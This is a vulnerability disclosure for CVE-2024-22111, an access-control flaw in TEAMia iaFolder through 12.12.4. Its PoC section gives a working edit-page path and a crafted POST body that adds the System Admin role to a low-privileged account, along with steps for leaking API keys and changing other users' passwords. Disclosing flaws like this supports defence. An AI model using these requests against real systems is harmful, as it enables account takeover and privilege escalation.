## CVE-2024-22111

### Description
> Incorrect Access Controls in the admin panel in TEAMia iaFolder through 12.12.4 allows an authenticated, low-privileged attacker to change the password of an arbitrary user account, add a role to an arbitrary user account, or discover API keys.

### Vulnerability Type
Vertical Access Control Elevation

### Vendor of Product
iaFolder

### Affected Product Code Base
iaFolders - Versions up to/including 12.12.4

### Exploitation
To exploit this vulnerability, an authenticated user can simply visit the administrative edit users page, and edit any account they wish by putting in a valid user ID.

### PoC

> To leak API keys or change the password of an arbitrary account, simple go to the edit page of the ID you want to change. 

`/Users/Edit/1`

> To modify your account to a System Administrator, simply modify your post request when editing your account with the following:

`&CurrentRoles%5B2%5D.Id=2&CurrentRoles%5B2%5D.DisplayName=System+Admin&CurrentRoles%5B2%5D.Enabled=true`

```
POST /Users/Edit/3 HTTP/2
[...]

[...]&CurrentRoles%5B2%5D.Id=2&CurrentRoles%5B2%5D.DisplayName=System+Admin&CurrentRoles%5B2%5D.Enabled=true
```

No checks were in place for this version to check if you can actually add roles to your account.